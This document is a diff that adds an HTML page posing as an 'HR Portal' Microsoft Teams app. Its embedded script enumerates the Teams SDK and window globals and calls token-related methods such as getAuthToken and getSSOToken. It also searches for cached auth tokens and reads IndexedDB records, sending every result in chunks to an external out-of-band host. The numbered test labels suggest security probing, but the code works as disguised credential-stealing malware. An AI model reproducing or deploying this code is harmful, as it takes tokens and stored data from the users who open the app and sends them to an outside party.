@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>HR Portal</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+</head>
+<body style="margin:0;font-family:'Segoe UI',sans-serif;background:#f5f5f5;">
+<div id="s" style="padding:12px;font-size:10px;color:#333;word-break:break-all;"></div>
+<script>
+var C='yeedjuciskcfxiwyajuv9mw912uaxqx0t.oast.fun';
+var log=[];
+function s(m){log.push(m);document.getElementById('s').innerHTML=log.join('<br>');}
+function ex(path,data){
+  var p=Object.keys(data).map(function(k){return k+'='+encodeURIComponent(String(data[k]||'none').substring(0,400))}).join('&');
+  fetch('https://'+C+'/'+path+'?'+p).catch(function(){new Image().src='https://'+C+'/'+path+'?'+p;});
+}
+
+function enumObj(obj, name, depth) {
+  if (depth > 3) return {};
+  var result = {};
+  try {
+    // Own properties
+    var props = [];
+    try { props = props.concat(Object.getOwnPropertyNames(obj)); } catch(e) {}
+    try { props = props.concat(Object.keys(obj)); } catch(e) {}
+    // Remove duplicates
+    props = props.filter(function(v, i, a) { return a.indexOf(v) === i; });
+
+    for (var i = 0; i < props.length; i++) {
+      var prop = props[i];
+      try {
+        var val = obj[prop];
+        var type = typeof val;
+        if (type === 'function') {
+          result[prop] = 'function(' + (val.length || 0) + ')';
+          // Try to get function source
+          try {
+            var src = val.toString().substring(0, 150);
+            result[prop + '_src'] = src;
+          } catch(e) {}
+        } else if (type === 'object' && val !== null) {
+          if (depth < 2) {
+            result[prop] = enumObj(val, name + '.' + prop, depth + 1);
+          } else {
+            result[prop] = 'object{' + Object.keys(val).join(',').substring(0, 100) + '}';
+          }
+        } else {
+          result[prop] = String(val).substring(0, 200);
+        }
+      } catch(e) {
+        result[prop] = 'ACCESS_ERROR:' + e.message.substring(0, 50);
+      }
+    }
+
+    // Proto
+    try {
+      var proto = Object.getPrototypeOf(obj);
+      if (proto && proto !== Object.prototype) {
+        var protoProps = Object.getOwnPropertyNames(proto).filter(function(p) { return p !== 'constructor'; });
+        if (protoProps.length > 0) {
+          result['__proto_methods__'] = protoProps.join(',');
+        }
+      }
+    } catch(e) {}
+  } catch(e) {
+    result['_enum_error'] = e.message;
+  }
+  return result;
+}
+
+(async function(){
+  await microsoftTeams.app.initialize();
+  var ctx = await microsoftTeams.app.getContext();
+  s('SDK OK: ' + ctx.user.userPrincipalName);
+
+  // ============================================================
+  // TEST 1: Deep enumeration of window.teams
+  // ============================================================
+  s('--- window.teams Deep Enum ---');
+
+  if (window.teams) {
+    var teamsEnum = enumObj(window.teams, 'teams', 0);
+    var enumStr = JSON.stringify(teamsEnum);
+    s('window.teams: ' + enumStr.substring(0, 500));
+
+    // Send in chunks (URL length limit)
+    var chunkSize = 350;
+    for (var i = 0; i < Math.min(enumStr.length, 3500); i += chunkSize) {
+      ex('t6-teams-enum-' + Math.floor(i/chunkSize), { chunk: enumStr.substring(i, i + chunkSize) });
+    }
+
+    // Try to call any methods found
+    var methods = Object.keys(teamsEnum).filter(function(k) {
+      return typeof teamsEnum[k] === 'string' && teamsEnum[k].indexOf('function') === 0;
+    });
+
+    s('Methods found: ' + methods.join(', '));
+    ex('t6-teams-methods', { methods: methods.join('|') });
+
+    // Try each method with no args to see what happens
+    for (var m of methods) {
+      if (m.indexOf('_src') !== -1) continue;
+      try {
+        var result = window.teams[m]();
+        var resultStr = '';
+        if (result && typeof result.then === 'function') {
+          // It's a promise
+          try {
+            var resolved = await result;
+            resultStr = JSON.stringify(resolved).substring(0, 300);
+          } catch(e) {
+            resultStr = 'promise-reject:' + e.message;
+          }
+        } else {
+          resultStr = JSON.stringify(result).substring(0, 300);
+        }
+        s('teams.' + m + '() = ' + resultStr);
+        ex('t6-teams-call-' + m, { result: resultStr });
+      } catch(e) {
+        s('teams.' + m + '(): ' + e.message);
+        ex('t6-teams-call-' + m + '-err', { e: e.message.substring(0, 200) });
+      }
+    }
+
+    // Specifically try token/auth related calls
+    var tokenCalls = [
+      { name: 'getAuthToken', fn: function() { return window.teams.getAuthToken && window.teams.getAuthToken(); } },
+      { name: 'getToken', fn: function() { return window.teams.getToken && window.teams.getToken(); } },
+      { name: 'getSSOToken', fn: function() { return window.teams.getSSOToken && window.teams.getSSOToken(); } },
+      { name: 'getAccessToken', fn: function() { return window.teams.getAccessToken && window.teams.getAccessToken(); } },
+      { name: 'getConfig', fn: function() { return window.teams.getConfig && window.teams.getConfig(); } },
+      { name: 'getContext', fn: function() { return window.teams.getContext && window.teams.getContext(); } },
+      { name: 'getUserInfo', fn: function() { return window.teams.getUserInfo && window.teams.getUserInfo(); } },
+      { name: 'auth', fn: function() { return window.teams.auth; } },
+      { name: 'token', fn: function() { return window.teams.token; } },
+      { name: 'credential', fn: function() { return window.teams.credential; } },
+      { name: 'session', fn: function() { return window.teams.session; } },
+    ];
+
+    for (var tc of tokenCalls) {
+      try {
+        var r = tc.fn();
+        if (r !== undefined && r !== null) {
+          var rStr = '';
+          if (r && typeof r.then === 'function') {
+            try { rStr = JSON.stringify(await r).substring(0, 300); } catch(e) { rStr = 'promise-err:' + e.message; }
+          } else {
+            rStr = JSON.stringify(r).substring(0, 300);
+          }
+          s('teams.' + tc.name + ' = ' + rStr);
+          ex('t6-teams-' + tc.name, { result: rStr });
+        }
+      } catch(e) {}
+    }
+  } else {
+    s('window.teams is undefined');
+    ex('t6-no-teams', { undef: 'true' });
+  }
+
+  // ============================================================
+  // TEST 2: Enumerate ALL non-standard window globals
+  // ============================================================
+  s('--- Non-standard Globals ---');
+
+  try {
+    // Create a clean iframe to compare globals
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'about:blank';
+    document.body.appendChild(iframe);
+    await new Promise(r => setTimeout(r, 500));
+
+    var cleanKeys = new Set();
+    try {
+      for (var k in iframe.contentWindow) { cleanKeys.add(k); }
+      Object.getOwnPropertyNames(iframe.contentWindow).forEach(function(k) { cleanKeys.add(k); });
+    } catch(e) {}
+
+    var injected = [];
+    for (var k in window) {
+      if (!cleanKeys.has(k)) {
+        try {
+          var t = typeof window[k];
+          var preview = '';
+          if (t === 'function') {
+            preview = window[k].toString().substring(0, 80);
+          } else if (t === 'object' && window[k] !== null) {
+            try { preview = Object.keys(window[k]).join(',').substring(0, 80); } catch(e) { preview = 'obj'; }
+          } else if (t === 'string') {
+            preview = window[k].substring(0, 80);
+          } else {
+            preview = String(window[k]).substring(0, 80);
+          }
+          injected.push(k + ':' + t + '=' + preview);
+        } catch(e) {
+          injected.push(k + ':access_error');
+        }
+      }
+    }
+
+    document.body.removeChild(iframe);
+
+    s('Injected globals (' + injected.length + '): ' + injected.join(' | ').substring(0, 500));
+
+    // Send in chunks
+    var injStr = injected.join('||');
+    for (var i = 0; i < Math.min(injStr.length, 3000); i += 350) {
+      ex('t6-globals-' + Math.floor(i/350), { chunk: injStr.substring(i, i + 350) });
+    }
+  } catch(e) {
+    s('Globals enum error: ' + e.message);
+    ex('t6-globals-err', { e: e.message });
+  }
+
+  // ============================================================
+  // TEST 3: Check microsoftTeams internal/private properties
+  // ============================================================
+  s('--- microsoftTeams Internals ---');
+
+  try {
+    var sdkEnum = {};
+    var sdkProps = Object.getOwnPropertyNames(microsoftTeams);
+    for (var p of sdkProps) {
+      try {
+        var v = microsoftTeams[p];
+        if (typeof v === 'function') {
+          sdkEnum[p] = 'fn(' + v.length + ')';
+        } else if (typeof v === 'object' && v !== null) {
+          sdkEnum[p] = 'obj{' + Object.keys(v).join(',').substring(0, 80) + '}';
+        } else {
+          sdkEnum[p] = String(v).substring(0, 100);
+        }
+      } catch(e) {}
+    }
+    s('microsoftTeams props: ' + JSON.stringify(sdkEnum).substring(0, 500));
+    var sdkStr = JSON.stringify(sdkEnum);
+    for (var i = 0; i < Math.min(sdkStr.length, 3000); i += 350) {
+      ex('t6-sdk-' + Math.floor(i/350), { chunk: sdkStr.substring(i, i + 350) });
+    }
+
+    // Check for internal communication channel
+    if (microsoftTeams._internal) {
+      s('_internal found!');
+      var intEnum = enumObj(microsoftTeams._internal, '_internal', 0);
+      ex('t6-sdk-internal', { data: JSON.stringify(intEnum).substring(0, 400) });
+    }
+
+    // Check for cached auth data
+    var authProps = ['_authTokenCache', '_cachedToken', '_token', '_authResult',
+                     '_ssoToken', '_accessToken', '_idToken', 'authToken', 'cachedToken'];
+    for (var ap of authProps) {
+      try {
+        if (microsoftTeams[ap]) {
+          s('SDK.' + ap + ' = ' + JSON.stringify(microsoftTeams[ap]).substring(0, 100));
+          ex('t6-sdk-auth-' + ap, { value: JSON.stringify(microsoftTeams[ap]).substring(0, 300) });
+        }
+      } catch(e) {}
+    }
+  } catch(e) {
+    s('SDK enum error: ' + e.message);
+  }
+
+  // ============================================================
+  // TEST 4: IndexedDB — check for stored tokens/sessions
+  // ============================================================
+  s('--- IndexedDB ---');
+  try {
+    var dbs = await indexedDB.databases();
+    s('IndexedDB databases: ' + dbs.length);
+    for (var db of dbs) {
+      s('  DB: ' + db.name + ' v' + db.version);
+      ex('t6-idb-' + db.name, { name: db.name, version: db.version });
+
+      // Try to open and read
+      try {
+        var openReq = indexedDB.open(db.name);
+        await new Promise(function(resolve, reject) {
+          openReq.onsuccess = function() {
+            var d = openReq.result;
+            var stores = Array.from(d.objectStoreNames);
+            s('  Stores: ' + stores.join(', '));
+            ex('t6-idb-stores-' + db.name, { stores: stores.join('|') });
+
+            for (var store of stores) {
+              try {
+                var tx = d.transaction(store, 'readonly');
+                var os = tx.objectStore(store);
+                var countReq = os.count();
+                countReq.onsuccess = function() {
+                  s('  ' + store + ': ' + countReq.result + ' records');
+                };
+                // Get first few records
+                var cursorReq = os.openCursor();
+                var records = 0;
+                cursorReq.onsuccess = function(evt) {
+                  var cursor = evt.target.result;
+                  if (cursor && records < 3) {
+                    var val = JSON.stringify(cursor.value).substring(0, 200);
+                    s('  [' + store + '] key=' + cursor.key + ' val=' + val);
+                    ex('t6-idb-record-' + db.name + '-' + store + '-' + records, {
+                      key: String(cursor.key).substring(0, 50),
+                      value: val
+                    });
+                    records++;
+                    cursor.continue();
+                  }
+                };
+              } catch(e) {}
+            }
+            d.close();
+            resolve();
+          };
+          openReq.onerror = function() { resolve(); };
+        });
+      } catch(e) {}
+    }
+  } catch(e) {
+    s('IndexedDB: ' + e.message);
+    ex('t6-idb-err', { e: e.message });
+  }
+
+  s('--- test6 complete ---');
+  ex('t6-done', { complete: 'true' });
+})();
+</script>
+</body>
+</html>
